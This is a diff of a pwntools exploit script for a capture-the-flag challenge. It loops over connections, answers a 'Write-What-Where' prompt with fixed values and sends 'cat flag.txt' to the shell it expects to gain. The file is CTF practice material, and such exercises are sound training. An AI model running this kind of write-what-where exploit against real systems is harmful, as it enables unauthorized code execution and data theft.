@@ -94,39 +94,52 @@ for i in range(255):
 
 
 """
-for i in range(5000):
-    print(i)
+for i in range(45):
     io = start()
 
-    io.recvline(timeout=1)
+    io.recvuntil(b"Write-What-Where:")
 
-    p = b"60"
+    p = "60"
     io.sendline(p)
 
     #i = 0
     #p1 = (256*i) + 65 # 256*n + 65
     #p1 = str(p1)
     #p1 = bytes(p1, 'utf-8')
-    io.sendline(b"17213")
+    #io.sendline(b"17213")
+    io.sendline("21314")
 
-    sleep(0.1)
+    io.sendline(b"")
+    io.sendline(b"cat flag.txt")
+    print(io.recvline(timeout=0.2))
 
-    io.sendline("cat flag.txt")
-    recv = io.recvline(timeout=0.1)
-    print(recv) 
-    if b"udctf" in recv:
-        print(recv)
-        break
+    io.sendline(b"")
+    io.sendline(b"cat flag.txt")
+    print(io.recvline(timeout=0.2))
 
-    recv = io.recvline(timeout=0.1)
-    print(recv)
-    if b"udctf" in recv:
-        print(recv)
-        break
-
+    io.sendline(b"")
+    io.sendline(b"cat flag.txt")
+    print(io.recvline(timeout=0.2))
     io.close()
+#io.interactive()
+"""
+io.sendline("cat flag.txt")
+recv = io.recvline(timeout=0.1)
+print(recv) 
+if b"udctf" in recv:
+    print(recv)
+    break
+
+recv = io.recvline(timeout=0.1)
+print(recv)
+if b"udctf" in recv:
+    print(recv)
+    break
+
+io.close()
 
 
 
 
     #io.interactive()
+    """
